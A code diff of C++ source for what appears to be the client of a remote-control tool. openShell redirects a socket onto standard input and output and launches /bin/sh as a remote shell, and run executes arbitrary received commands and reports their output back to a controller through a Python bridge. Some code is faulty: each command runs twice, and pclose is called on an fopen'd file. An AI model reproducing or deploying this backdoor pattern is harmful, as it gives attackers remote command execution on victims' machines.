@@ -18,15 +18,16 @@
 
 using namespace std;
 
-clientManager::clientManager(){
-
+clientManager::clientManager()
+{
     pModule =  PyImport_Import(PyUnicode_FromString("link"));
     
     link = PyObject_GetAttrString(pModule, "link");
     ficar = makeRegister();
 }
 
-clientManager::~clientManager(){
+clientManager::~clientManager()
+{
 
 }
 
@@ -54,8 +55,9 @@ clientManager::getArgs()
     CPyObject lista = PyList_New(size);
     lista = PyObject_CallMethod(link, "getArgs", NULL);
     for (long i = 0; (Py_ssize_t)i < size ;i++)
+    {
         saida.push_back(string(PyUnicode_AsUTF8(PyList_GetItem(lista,(Py_ssize_t) i))));
-    
+    }
     return saida;
     
 }
@@ -107,44 +109,41 @@ clientManager::openShell(vector<string> cmd)
                 dup2(s, 0);
                 dup2(s, 1);
                 dup2(s, 2);
-
+                
                 cout << "starting bash" << endl;
-
-                system("/bin/sh");
+                try
+                {
+                    response = string("connected");
+                    PyObject_CallMethod(link, "report", "(s)", response.c_str());
+                    system("/bin/sh");
+                }
+                catch(const std::exception& e)
+                {
+                    PyObject_CallMethod(link, "report", "(s)", e.what());
+                }
             }
             else 
             {
                 response=string("not connect") + strerror (errno);
+                PyObject_CallMethod(link, "report", "(s)", response.c_str());
             }
         }
-        else {
+        else 
+        {
             response=string("shell failed!") + strerror (errno);
+            PyObject_CallMethod(link, "report", "(s)", response.c_str());
         }
-        PyObject_CallMethod(link, "report", "(s)", response.c_str());
-        //manager.report(response.c_str());
-
     }
     else
     {
-        cout << "if 1" << endl;
         waitpid(pid_fork,&status,0 );
         if (WIFEXITED(status))
         {
-            printf("Exited Normally\n");
+            response=string("Exited Normally");
+            PyObject_CallMethod(link, "report", "(s)", response.c_str());
         }
     }
     
-}
-
-
-
-
-
-void 
-clientManager::execute(vector <string> cmd)//execProgram
-{
-    cout << "execProgram não implementado: " << endl;
-    PyObject_CallMethod(link, "report", "(s)", "execProgram não implementado");
 }
 
 void 
@@ -155,19 +154,38 @@ clientManager::run(vector <string> cmd)//runCommand
     {
         char buffer[128];
         string result = "";
+        bool erro=false;
 
         cout << "Executing command: " << cmd[0] << endl;
-        
+        cmd[0]+=" 2>>error.txt";
+
         FILE* pipe = popen(cmd[0].c_str(), "r");
 
-        if (!pipe){
-            PyObject_CallMethod(link, "report", "(s)", "file was not sent");
-            cout << "command not found" << endl;
+        if (sizeError(cmd[0])!=0)
+        {
+            pclose(pipe);
+            pipe = fopen("error.txt", "r");
+            erro = true;
         }
-        else {
-            try {
-                while (fgets(buffer, sizeof buffer, pipe) != NULL) {
-                   result += buffer;
+        if (!pipe)
+        {
+            PyObject_CallMethod(link, "report", "(s)", "file was not sent");
+            cout << "file was not sent" << endl;
+        }
+        else 
+        {
+            try 
+            {
+                while (fgets(buffer, sizeof (buffer), pipe) != NULL) 
+                {
+                    result += buffer;
+                }
+                pclose(pipe);
+                if (erro==false){
+                    PyObject_CallMethod(link, "report", "(s)", result.c_str());
+                }
+                else {
+                    PyObject_CallMethod(link, "report", "(s)", "command not found");
                 }
             } 
             catch (...) 
@@ -176,18 +194,41 @@ clientManager::run(vector <string> cmd)//runCommand
                 cout << "command nor response of terminal." << endl;
             }
         }
-        pclose(pipe);
-
-        cout << result << endl;
-
-        PyObject_CallMethod(link, "report", "(s)", "command executed"); //arquivo do admin para o cliente
         cout << "end of command executed" << endl;
-        
+        system("rm error.txt");
     }
     else 
     {
         cout << "command not executed: " << cmd.size() << endl;
     } 
+}
+
+unsigned
+clientManager::sizeError(string command)
+{
+    system((command += " 1>>a.txt ").c_str());
+    system("rm a.txt");
+    FILE *A =  fopen("error.txt","r");
+    unsigned size=0;
+    char buffer[128];
+    if (!A)
+    {
+        return 0;
+    }
+    try 
+    {
+        while (fgets(buffer, sizeof(buffer), A) != NULL) 
+        {
+            size++;
+        }
+        pclose(A);
+        return size;
+    } 
+    catch (...) 
+    {
+        pclose(A);
+        return 0;
+    }
 }
 
 void 
